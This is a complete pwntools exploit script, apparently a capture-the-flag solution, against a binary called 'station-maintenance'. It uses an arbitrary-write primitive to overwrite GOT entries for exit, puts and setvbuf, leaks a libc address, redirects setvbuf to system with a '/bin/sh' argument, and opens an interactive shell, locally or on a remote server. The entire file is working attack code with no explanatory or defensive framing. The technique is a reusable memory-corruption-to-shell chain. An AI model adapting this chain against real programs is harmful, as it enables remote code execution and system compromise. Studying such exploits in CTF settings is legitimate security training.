#!/usr/bin/python3
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB: 
        return gdb.debug([exe] + argv, gdbscript="c", *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

exe = './station-maintenance'
elf = context.binary = ELF(exe, checksec=False)
#context.log_level = 'debug'

libc = ELF("glibc/libc.so.6")

def arb_write(val, location):
    io.sendafter(b'Parameter value\n', val)
    io.sendlineafter(b'Target\n', location)

io = start()

arb_write(p32(elf.sym.main + 89), str(elf.got.exit).encode())

arb_write(p32(elf.got.puts), str(elf.sym.stdin).encode())
arb_write(p32(0), str(elf.sym.stdin + 4).encode())

# libc leak
arb_write(p32(elf.plt.puts), str(elf.got.setvbuf).encode())
arb_write(p32(0), str(elf.got.setvbuf + 4).encode())

arb_write(p32(elf.symbols.main +5), str(elf.got.exit))

io.recvline()
io.recvline()

leak = u64(io.recvline()[:-1].ljust(8, b'\x00'))
info(f"Libc leak: {hex(leak)}")
libc.address = leak - libc.sym.puts

info(f"Libc Base: {hex(libc.address)}")

# Avoid init
arb_write(p32(elf.sym.main + 89), str(elf.got.exit).encode())

# bsh
bsh = libc.address + 0x1d8678

arb_write(p64(bsh)[:4], str(elf.symbols.stdin).encode())
arb_write(p64(bsh)[4:], str(elf.symbols.stdin +4).encode())

# system
# overwrite setvbuf with system
arb_write(p64(libc.sym.system)[:4], str(elf.got.setvbuf).encode())
arb_write(p64(libc.sym.system)[4:], str(elf.got.setvbuf +4).encode())

# trigger 

arb_write(p32(elf.symbols.main + 5), str(elf.got.exit).encode())

info(f"Pwned ;)")

io.interactive()
